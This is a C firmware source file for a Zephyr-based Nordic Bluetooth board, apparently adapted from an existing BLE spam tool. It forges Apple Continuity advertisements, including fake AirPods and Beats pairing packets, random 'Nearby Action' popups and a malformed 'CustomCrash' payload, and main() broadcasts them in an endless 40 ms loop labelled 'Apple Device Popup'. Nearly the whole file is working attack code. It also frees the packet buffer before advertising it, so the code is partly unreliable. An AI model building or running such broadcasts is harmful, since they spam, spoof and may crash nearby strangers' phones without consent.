/*
 * Copyright (c) 2019 Nordic Semiconductor ASA
 *
 * SPDX-License-Identifier: LicenseRef-Nordic-5-Clause
 */

#include <zephyr/console/console.h>
#include <string.h>
#include <zephyr/sys/printk.h>
#include <zephyr/types.h>

#define BT_LE_ADV_NCONN_CUSTOM BT_LE_ADV_PARAM(0, BT_GAP_ADV_FAST_INT_MIN_1, \
					BT_GAP_ADV_FAST_INT_MAX_1, NULL)


#if defined(CONFIG_USB_DEVICE_STACK)
#include <zephyr/usb/usb_device.h>
#include <zephyr/drivers/uart.h>
#endif

#include <zephyr/bluetooth/bluetooth.h>
#include <zephyr/bluetooth/conn.h>
#include <zephyr/bluetooth/gatt.h>
#include <zephyr/bluetooth/hci.h>
#include <zephyr/bluetooth/uuid.h>
#include <bluetooth/services/latency.h>
#include <bluetooth/services/latency_client.h>
#include <bluetooth/scan.h>
#include <bluetooth/gatt_dm.h>
#include <sdc_hci_vs.h>

//--------------Added by me
#include <zephyr/random/rand32.h>
#include <zephyr/kernel.h>
#include <zephyr/drivers/gpio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>

#define LED0_NODE DT_ALIAS(led0)
#define ATTACKS_COUNT ((signed)COUNT_OF(attacks))
#define COUNT_OF(arr) (sizeof(arr) / sizeof((arr)[0]))
//------------------

#define DEVICE_NAME	CONFIG_BT_DEVICE_NAME
#define DEVICE_NAME_LEN (sizeof(DEVICE_NAME) - 1)



typedef struct Attack Attack;

static const struct gpio_dt_spec led = GPIO_DT_SPEC_GET(LED0_NODE, gpios);


typedef struct {
    Attack* attack;
    uint8_t byte_store[3];
    
} Ctx;


//~~~~~~~~~~~~~~~~~~~~~~~~~_base.h
typedef struct Payload Payload;

typedef struct {
    const char* (*get_name)(const Payload* payload);
    void (*make_packet)(uint8_t* _size, uint8_t** _packet, Payload* payload);
    void (*extra_config)(Ctx* ctx);
    uint8_t (*config_count)(const Payload* payload);
} Protocol;

//~~~~~~~~~~~~~~~~~~~~~continuity.h
typedef enum {
    ContinuityTypeAirDrop = 0x05,
    ContinuityTypeProximityPair = 0x07,
    ContinuityTypeAirplayTarget = 0x09,
    ContinuityTypeHandoff = 0x0C,
    ContinuityTypeTetheringSource = 0x0E,
    ContinuityTypeNearbyAction = 0x0F,
    ContinuityTypeNearbyInfo = 0x10,

    ContinuityTypeCustomCrash,
    ContinuityTypeCOUNT
} ContinuityType;

enum {
    ConfigRandomMac,
    ConfigExtraStart = ConfigRandomMac,
    ConfigLedIndicator,
    ConfigLockKeyboard,
};

typedef enum {
    ContinuityPpBruteforceModel,
    ContinuityPpBruteforceColor,
} ContinuityPpBruteforce;

typedef struct {
    ContinuityType type;
    union {
        struct {
            ContinuityPpBruteforce bruteforce_mode;
            uint16_t model;
            uint8_t color;
            uint8_t prefix;
        } proximity_pair;
        struct {
            uint8_t action;
            uint8_t flags;
        } nearby_action;
    } data;
} ContinuityCfg;

const Protocol protocol_continuity;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~_protocols.h i _protocols.c


typedef enum {
    PayloadModeRandom,
    PayloadModeValue,
    PayloadModeBruteforce,
} PayloadMode;

struct Payload {
    bool random_mac;
    PayloadMode mode;
    struct {
        uint8_t counter;
        uint32_t value;
        uint8_t size;
    } bruteforce;
    union {
        ContinuityCfg continuity;
    } cfg;
};

extern const Protocol* protocols[];

extern const size_t protocols_count;

struct Attack {
    const char* title;
    const char* text;
    const Protocol* protocol;
    Payload payload;
};
const Protocol* protocols[] = {
    &protocol_continuity,
   
};

const size_t protocols_count = COUNT_OF(protocols);

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~continuity.c

typedef struct {
    uint8_t value;
    const char* name;
} ContinuityColor;

static const ContinuityColor colors_white[] = {
    {0x00, "White"},
};
static const ContinuityColor colors_airpods_max[] = {
    {0x00, "White"},
    {0x02, "Red"},
    {0x03, "Blue"},
    {0x0F, "Black"},
    {0x11, "Light Green"},
};
static const ContinuityColor colors_beats_flex[] = {
    {0x00, "White"},
    {0x01, "Black"},
};
static const ContinuityColor colors_beats_solo_3[] = {
    {0x00, "White"},
    {0x01, "Black"},
    {0x6, "Gray"},
    {0x7, "Gold/White"},
    {0x8, "Rose Gold"},
    {0x09, "Black"},
    {0xE, "Violet/White"},
    {0xF, "Bright Red"},
    {0x12, "Dark Red"},
    {0x13, "Swamp Green"},
    {0x14, "Dark Gray"},
    {0x15, "Dark Blue"},
    {0x1D, "Rose Gold 2"},
    {0x20, "Blue/Green"},
    {0x21, "Purple/Orange"},
    {0x22, "Deep Blue/ Light blue"},
    {0x23, "Magenta/Light Fuchsia"},
    {0x25, "Black/Red"},
    {0x2A, "Gray / Disney LTD"},
    {0x2E, "Pinkish white"},
    {0x3D, "Red/Blue"},
    {0x3E, "Yellow/Blue"},
    {0x3F, "White/Red"},
    {0x40, "Purple/White"},
    {0x5B, "Gold"},
    {0x5C, "Silver"},
};
static const ContinuityColor colors_powerbeats_3[] = {
    {0x00, "White"},
    {0x01, "Black"},
    {0x0B, "Gray/Blue"},
    {0x0C, "Gray/Red"},
    {0x0D, "Gray/Green"},
    {0x12, "Red"},
    {0x13, "Swamp Green"},
    {0x14, "Gray"},
    {0x15, "Deep Blue"},
    {0x17, "Dark with Gold Logo"},
};
static const ContinuityColor colors_powerbeats_pro[] = {
    {0x00, "White"},
    {0x02, "Yellowish Green"},
    {0x03, "Blue"},
    {0x04, "Black"},
    {0x05, "Pink"},
    {0x06, "Red"},
    {0x0B, "Gray ?"},
    {0x0D, "Sky Blue"},
};
static const ContinuityColor colors_beats_solo_pro[] = {
    {0x00, "White"},
    {0x01, "Black"},
};
static const ContinuityColor colors_beats_studio_buds[] = {
    {0x00, "White"},
    {0x01, "Black"},
    {0x02, "Red"},
    {0x03, "Blue"},
    {0x04, "Pink"},
    {0x06, "Silver"},
};
static const ContinuityColor colors_beats_x[] = {
    {0x00, "White"},
    {0x01, "Black"},
    {0x02, "Blue"},
    {0x05, "Gray"},
    {0x1D, "Pink"},
    {0x25, "Dark/Red"},
};
static const ContinuityColor colors_beats_studio_3[] = {
    {0x00, "White"},
    {0x01, "Black"},
    {0x02, "Red"},
    {0x03, "Blue"},
    {0x18, "Shadow Gray"},
    {0x19, "Desert Sand"},
    {0x25, "Black / Red"},
    {0x26, "Midnight Black"},
    {0x27, "Desert Sand 2"},
    {0x28, "Gray"},
    {0x29, "Clear blue/ gold"},
    {0x42, "Green Forest camo"},
    {0x43, "White Camo"},
};
static const ContinuityColor colors_beats_studio_pro[] = {
    {0x00, "White"},
    {0x01, "Black"},
};
static const ContinuityColor colors_beats_fit_pro[] = {
    {0x00, "White"},
    {0x01, "Black"},
    {0x02, "Pink"},
    {0x03, "Grey/White"},
    {0x04, "Full Pink"},
    {0x05, "Neon Green"},
    {0x06, "Night Blue"},
    {0x07, "Light Pink"},
    {0x08, "Brown"},
    {0x09, "Dark Brown"},
};
static const ContinuityColor colors_beats_studio_buds_[] = {
    {0x00, "Black"},
    {0x01, "White"},
    {0x02, "Transparent"},
    {0x03, "Silver"},
    {0x04, "Pink"},
};

static const struct {
    uint16_t value;
    const char* name;
    const ContinuityColor* colors;
    const uint8_t colors_count;
} pp_models[] = {
    {0x0E20, "AirPods Pro", colors_white, COUNT_OF(colors_white)},
    {0x0A20, "AirPods Max", colors_airpods_max, COUNT_OF(colors_airpods_max)},
    {0x0055, "Airtag", colors_white, COUNT_OF(colors_white)},
    {0x0030, "Hermes Airtag", colors_white, COUNT_OF(colors_white)},
    {0x0220, "AirPods", colors_white, COUNT_OF(colors_white)},
    {0x0F20, "AirPods 2nd Gen", colors_white, COUNT_OF(colors_white)},
    {0x1320, "AirPods 3rd Gen", colors_white, COUNT_OF(colors_white)},
    {0x1420, "AirPods Pro 2nd Gen", colors_white, COUNT_OF(colors_white)},
    {0x1020, "Beats Flex", colors_beats_flex, COUNT_OF(colors_beats_flex)},
    {0x0620, "Beats Solo 3", colors_beats_solo_3, COUNT_OF(colors_beats_solo_3)},
    {0x0320, "Powerbeats 3", colors_powerbeats_3, COUNT_OF(colors_powerbeats_3)},
    {0x0B20, "Powerbeats Pro", colors_powerbeats_pro, COUNT_OF(colors_powerbeats_pro)},
    {0x0C20, "Beats Solo Pro", colors_beats_solo_pro, COUNT_OF(colors_beats_solo_pro)},
    {0x1120, "Beats Studio Buds", colors_beats_studio_buds, COUNT_OF(colors_beats_studio_buds)},
    {0x0520, "Beats X", colors_beats_x, COUNT_OF(colors_beats_x)},
    {0x0920, "Beats Studio 3", colors_beats_studio_3, COUNT_OF(colors_beats_studio_3)},
    {0x1720, "Beats Studio Pro", colors_beats_studio_pro, COUNT_OF(colors_beats_studio_pro)},
    {0x1220, "Beats Fit Pro", colors_beats_fit_pro, COUNT_OF(colors_beats_fit_pro)},
    {0x1620, "Beats Studio Buds+", colors_beats_studio_buds_, COUNT_OF(colors_beats_studio_buds_)},
};
static const uint8_t pp_models_count = COUNT_OF(pp_models);

static const struct {
    uint8_t value;
    const char* name;
} pp_prefixes[] = {
    {0x07, "New Device"},
    {0x01, "Not Your Device"},
    {0x05, "New Airtag"},
};
static const uint8_t pp_prefixes_count = COUNT_OF(pp_prefixes);

static const struct {
    uint8_t value;
    const char* name;
} na_actions[] = {
    {0x13, "AppleTV AutoFill"},
    {0x24, "Apple Vision Pro"},
    {0x05, "Apple Watch"},
    {0x27, "AppleTV Connecting..."},
    {0x20, "Join This AppleTV?"},
    {0x19, "AppleTV Audio Sync"},
    {0x1E, "AppleTV Color Balance"},
    {0x09, "Setup New iPhone"},
    {0x2F, "Sign in to other device"},
    {0x02, "Transfer Phone Number"},
    {0x0B, "HomePod Setup"},
    {0x01, "Setup New AppleTV"},
    {0x06, "Pair AppleTV"},
    {0x0D, "HomeKit AppleTV Setup"},
    {0x2B, "AppleID for AppleTV?"},
};
static const uint8_t na_actions_count = COUNT_OF(na_actions);

static const char* type_names[ContinuityTypeCOUNT] = {
    [ContinuityTypeAirDrop] = "AirDrop",
    [ContinuityTypeProximityPair] = "Continuity Pair",
    [ContinuityTypeAirplayTarget] = "Airplay Target",
    [ContinuityTypeHandoff] = "Handoff",
    [ContinuityTypeTetheringSource] = "Tethering Source",
    [ContinuityTypeNearbyAction] = "Continuity Action",
    [ContinuityTypeNearbyInfo] = "Nearby Info",
    [ContinuityTypeCustomCrash] = "Continuity Custom",
};
static const char* get_name(const Payload* payload) {
    const ContinuityCfg* cfg = &payload->cfg.continuity;
    return type_names[cfg->type];
}

//#define HEADER_LEN (6) // 1 Size + 1 AD Type + 2 Company ID + 1 Continuity Type + 1 Continuity Size
#define HEADER_LEN (4) // + 2 Company ID + 1 Continuity Type + 1 Continuity Size

static uint8_t packet_sizes[ContinuityTypeCOUNT] = {
    [ContinuityTypeAirDrop] = HEADER_LEN + 18,
    [ContinuityTypeProximityPair] = HEADER_LEN + 25,
    [ContinuityTypeAirplayTarget] = HEADER_LEN + 6,
    [ContinuityTypeHandoff] = HEADER_LEN + 14,
    [ContinuityTypeTetheringSource] = HEADER_LEN + 6,
    [ContinuityTypeNearbyAction] = HEADER_LEN + 5,
    [ContinuityTypeNearbyInfo] = HEADER_LEN + 5,
    [ContinuityTypeCustomCrash] = HEADER_LEN + 11,
};
static void make_packet_proximity_pair(uint8_t* _size, uint8_t** _packet, Payload* payload) {
    ContinuityType type;
    type = ContinuityTypeProximityPair;
    uint8_t size = packet_sizes[type];
    uint8_t* packet = malloc(size);
    uint8_t i = 0;

    // packet[i++] = size - 1; // Size
    // packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
    packet[i++] = 0x4C; // Company ID (Apple, Inc.)
    packet[i++] = 0x00; // ...
    packet[i++] = type; // Continuity Type TOCNO
    packet[i] = size - i - 1; // Continuity Size
    i++;

    uint16_t model;
    uint8_t color;

    /*
    //gets a random index model from the model struct
    uint8_t model_index = rand() % pp_models_count;

    //gets a random color index from the random model struct previously selected
    uint8_t color_index = rand() % pp_models[model_index].colors_count;

    //gets the values of model and color based on index
    model = pp_models[model_index].value;
    color = pp_models[model_index].colors[color_index].value;


    //Ako je airtag onda mora bit 0x05 (0x0055 i 0x0030 su airtagoci), ako ne onda 0x01
    uint8_t prefix = (model == 0x0055 || model == 0x0030) ? 0x05 : 0x01;
    */
   //{0x0E20, "AirPods Pro", colors_white, COUNT_OF(colors_white)},

   model = 0x0E20;
   color = 0x00;
   uint8_t prefix = 0x01;

    packet[i++] = prefix; // Prefix (paired 0x01 new 0x07 airtag 0x05)
    packet[i++] = (model >> 0x08) & 0xFF; // Device Model
    packet[i++] = (model >> 0x00) & 0xFF; // ...
    packet[i++] = 0x55; // Status
    packet[i++] = ((rand() % 10) << 4) + (rand() % 10); // Buds Battery Level
    packet[i++] = ((rand() % 8) << 4) + (rand() % 10); // Charging Status and Battery Case Level
    packet[i++] = (rand() % 256); // Lid Open Counter
    packet[i++] = color; // Device Color
    packet[i++] = 0x00;
    //sys_csrand_get(&packet[i], 16); // Encrypted Payload
    sys_rand_get(&packet[i], 16); // Encrypted Payload
    
    i += 16;

    *_size = size;
    *_packet = packet;
    
}




static void make_packet_action_modal(uint8_t* _size, uint8_t** _packet, Payload* payload) {
    ContinuityType type;
    type = ContinuityTypeNearbyAction;
    uint8_t size = packet_sizes[type];
    uint8_t* packet = malloc(size);
    uint8_t i = 0;

    
    packet[i++] = 0x4C; // Company ID (Apple, Inc.)
    packet[i++] = 0x00; // ovo je dio company IDa isto
    packet[i++] = type; // Continuity Type
    packet[i] = size - i - 1; // Continuity Size
    i++;

   
    uint8_t action;    
    action = na_actions[rand() % na_actions_count].value;
        
    uint8_t flags;
    flags = 0xC0;
    if(action == 0x20 && rand() % 2) flags--; // More spam for 'Join This AppleTV?'
    if(action == 0x09 && rand() % 2) flags = 0x40; // Glitched 'Setup New Device'

    packet[i++] = flags; // Action Flags
    packet[i++] = action; // Action Type
    sys_rand_get (&packet[i], 3); // Authentication Tag ---------------------------------------------i ovu liniju si zaminia
    i += 3;
    
    *_size = size;
    *_packet = packet;
}

static void make_packet(uint8_t* _size, uint8_t** _packet, Payload* payload) {
    ContinuityCfg* cfg = payload ? &payload->cfg.continuity : NULL;

    ContinuityType type;
    if(cfg && cfg->type != 0x00) {
        type = cfg->type;
    } else {
        const ContinuityType types[] = {
            ContinuityTypeProximityPair,
            ContinuityTypeNearbyAction,
            ContinuityTypeCustomCrash,
        };
        type = types[rand() % COUNT_OF(types)];

    }

    uint8_t size = packet_sizes[type];
    uint8_t* packet = malloc(size);
    uint8_t i = 0;

    packet[i++] = size - 1; // Size
    packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
    packet[i++] = 0x4C; // Company ID (Apple, Inc.)
    packet[i++] = 0x00; // ...
    packet[i++] = type; // Continuity Type
    packet[i] = size - i - 1; // Continuity Size
    i++;

    switch(type) {
    case ContinuityTypeAirDrop: {
        packet[i++] = 0x00; // Zeros
        packet[i++] = 0x00; // ...
        packet[i++] = 0x00; // ...
        packet[i++] = 0x00; // ...
        packet[i++] = 0x00; // ...
        packet[i++] = 0x00; // ...
        packet[i++] = 0x00; // ...
        packet[i++] = 0x00; // ...
        packet[i++] = 0x01; // Version
        packet[i++] = (rand() % 256); // AppleID
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // Phone Number
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // Email
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // Email2
        packet[i++] = (rand() % 256); // ...
        packet[i++] = 0x00; // Zero
        break;
    }

    case ContinuityTypeProximityPair: {
        uint16_t model;
        uint8_t color;
        switch(payload ? payload->mode : PayloadModeRandom) {
        case PayloadModeRandom:
        default: {
            uint8_t model_index = rand() % pp_models_count;
            uint8_t color_index = rand() % pp_models[model_index].colors_count;
            model = pp_models[model_index].value;
            color = pp_models[model_index].colors[color_index].value;
            break;
        }
        case PayloadModeValue:
            model = cfg->data.proximity_pair.model;
            color = cfg->data.proximity_pair.color;
            break;
        case PayloadModeBruteforce:
            switch(cfg->data.proximity_pair.bruteforce_mode) {
            case ContinuityPpBruteforceModel:
            default:
                model = cfg->data.proximity_pair.model = payload->bruteforce.value;
                color = cfg->data.proximity_pair.color;
                break;
            case ContinuityPpBruteforceColor:
                model = cfg->data.proximity_pair.model;
                color = cfg->data.proximity_pair.color = payload->bruteforce.value;
                break;
            }
            break;
        }

        uint8_t prefix;
        if(cfg && cfg->data.proximity_pair.prefix != 0x00) {
            prefix = cfg->data.proximity_pair.prefix;
        } else {
            if(model == 0x0055 || model == 0x0030)
                prefix = 0x05;
            else
                prefix = 0x01;
        }

        packet[i++] = prefix; // Prefix (paired 0x01 new 0x07 airtag 0x05)
        packet[i++] = (model >> 0x08) & 0xFF; // Device Model
        packet[i++] = (model >> 0x00) & 0xFF; // ...
        packet[i++] = 0x55; // Status
        packet[i++] = ((rand() % 10) << 4) + (rand() % 10); // Buds Battery Level
        packet[i++] = ((rand() % 8) << 4) + (rand() % 10); // Charing Status and Battery Case Level
        packet[i++] = (rand() % 256); // Lid Open Counter
        packet[i++] = color; // Device Color
        packet[i++] = 0x00;
        sys_csrand_get(&packet[i], 16); // Encrypted Payload ------------------------------------------OVU LINIJU SI IZMINIJA I NIJE COPY PASTE
        i += 16;
        break;
    }

    case ContinuityTypeAirplayTarget: {
        packet[i++] = (rand() % 256); // Flags
        packet[i++] = (rand() % 256); // Configuration Seed
        packet[i++] = (rand() % 256); // IPv4 Address
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        break;
    }

    case ContinuityTypeHandoff: {
        packet[i++] = 0x01; // Version
        packet[i++] = (rand() % 256); // Initialization Vector
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // AES-GCM Auth Tag
        packet[i++] = (rand() % 256); // Encrypted Payload
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        break;
    }

    case ContinuityTypeTetheringSource: {
        packet[i++] = 0x01; // Version
        packet[i++] = (rand() % 256); // Flags
        packet[i++] = (rand() % 101); // Battery Life
        packet[i++] = 0x00; // Cell Service Type
        packet[i++] = (rand() % 8); // ...
        packet[i++] = (rand() % 5); // Cell Service Strength
        break;
    }

    case ContinuityTypeNearbyAction: {
        uint8_t action;
        switch(payload ? payload->mode : PayloadModeRandom) {
        case PayloadModeRandom:
        default:
            action = na_actions[rand() % na_actions_count].value;
            break;
        case PayloadModeValue:
            action = cfg->data.nearby_action.action;
            break;
        case PayloadModeBruteforce:
            action = cfg->data.nearby_action.action = payload->bruteforce.value;
            break;
        }

        uint8_t flags;
        if(cfg && cfg->data.nearby_action.flags != 0x00) {
            flags = cfg->data.nearby_action.flags;
        } else {
            flags = 0xC0;
            if(action == 0x20 && rand() % 2) flags--; // More spam for 'Join This AppleTV?'
            if(action == 0x09 && rand() % 2) flags = 0x40; // Glitched 'Setup New Device'
        }

        packet[i++] = flags; // Action Flags
        packet[i++] = action; // Action Type
        sys_rand_get (&packet[i], 3); // Authentication Tag ---------------------------------------------i ovu liniju si zaminia
        i += 3;
        break;
    }

    case ContinuityTypeNearbyInfo: {
        packet[i++] = ((rand() % 16) << 4) + (rand() % 16); // Status Flags and Action Code
        packet[i++] = (rand() % 256); // Status Flags
        packet[i++] = (rand() % 256); // Authentication Tag
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        break;
    }

    case ContinuityTypeCustomCrash: {
        // Found by @ECTO-1A

        uint8_t action = na_actions[rand() % na_actions_count].value;
        uint8_t flags = 0xC0;
        if(action == 0x20 && rand() % 2) flags--; // More spam for 'Join This AppleTV?'
        if(action == 0x09 && rand() % 2) flags = 0x40; // Glitched 'Setup New Device'

        i -= 2; // Override segment header
        packet[i++] = ContinuityTypeNearbyAction; // Continuity Type
        packet[i++] = 5; // Continuity Size
        packet[i++] = flags; // Action Flags
        packet[i++] = action; // Action Type
        sys_rand_get(&packet[i], 3); // Authentication Tag ---------------------------------------------i ovo
        i += 3;

        packet[i++] = 0x00; // Additional Action Data Terminator (?)
        packet[i++] = 0x00; // ...

        packet[i++] = ContinuityTypeNearbyInfo; // Continuity Type (?)
        sys_rand_get(&packet[i], 3); // Continuity Size (?) + Shenanigans (???) ------------------------------i ovo
        i += 3;
        break;
    }

    default:
        break;
    }

    *_size = size;
    *_packet = packet;
}


const Protocol protocol_continuity = {
    .get_name = get_name,
    .make_packet = make_packet_action_modal, //OVO SI IZMINIAAAA ISTOOOOO
};


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ble-spam.c


typedef struct {
    Ctx ctx;
    

    bool resume;
    bool advertising;
    uint8_t delay;
    int8_t index;
    bool ignore_bruteforce;
} State;


int main(void* _ctx) {

	if (!gpio_is_ready_dt(&led)) {
		return 0;
	}
	int ret;
	ret = gpio_pin_configure_dt(&led, GPIO_OUTPUT_ACTIVE);
	if (ret < 0) {
		return 0;
	}//LED

	static Attack attack= {
        .title = "Apple Device Popup",
        .text = "No cooldown, close range",
        .protocol = &protocol_continuity,
        .payload =
            {
                .random_mac = false,
                .cfg.continuity =
                    {
                        .type = ContinuityTypeProximityPair,
                    },
            },
    };

    State* state = _ctx;
    uint8_t size;
    uint16_t delay;
    uint8_t* packet;
    Payload* payload = &attack.payload;
    const Protocol* protocol = attack.protocol;
   
	int err=bt_enable(NULL);
	if(err){
		printk("Bluetooth init failed (err %d)\n", err);
		return 0;
	}


    while(true) {

		k_msleep(40);
        protocol->make_packet(&size, &packet, NULL);
		
		struct bt_data ad[] = {
                BT_DATA_BYTES(BT_DATA_FLAGS, (BT_LE_AD_GENERAL | BT_LE_AD_NO_BREDR)),
				BT_DATA(BT_DATA_MANUFACTURER_DATA, packet, size),
                //BT_DATA(BT_DATA_BROADCAST_NAME, "NRF CONNECT", 11),
                //BT_DATA(BT_DATA_NAME_COMPLETE, "NRF",3 ),
		};

        static const struct bt_data sd[] = {
	        BT_DATA(BT_DATA_NAME_COMPLETE, DEVICE_NAME, DEVICE_NAME_LEN),
        };


        free(packet);
		
		bt_le_adv_start(BT_LE_ADV_NCONN_CUSTOM, ad, ARRAY_SIZE(ad), NULL, 0);
		ret = gpio_pin_toggle_dt(&led);
    	k_msleep(20);
    	bt_le_adv_stop();
    }


    return 0;
}

